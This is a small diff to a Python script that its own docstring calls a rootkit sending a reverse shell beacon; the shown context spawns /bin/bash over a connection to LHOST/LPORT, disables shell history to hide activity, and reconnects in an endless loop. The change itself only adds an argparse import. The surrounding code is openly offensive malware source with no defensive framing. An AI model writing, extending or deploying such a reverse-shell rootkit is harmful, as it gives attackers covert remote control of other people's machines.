@@ -5,6 +5,7 @@ from os import getpid, dup2, putenv
 from random import choice
 from time import sleep
 from pty import spawn
+from argparse import ArgumentParser
 
 """
 rootkit to install on client and sends a reverse shell beacon
@@ -32,6 +33,7 @@ def shell(lhost, lport):
     putenv("HISTFILE", '/dev/null')
     spawn("/bin/bash")
     s.close()
+
 
 while True:
     shell(LHOST, LPORT)
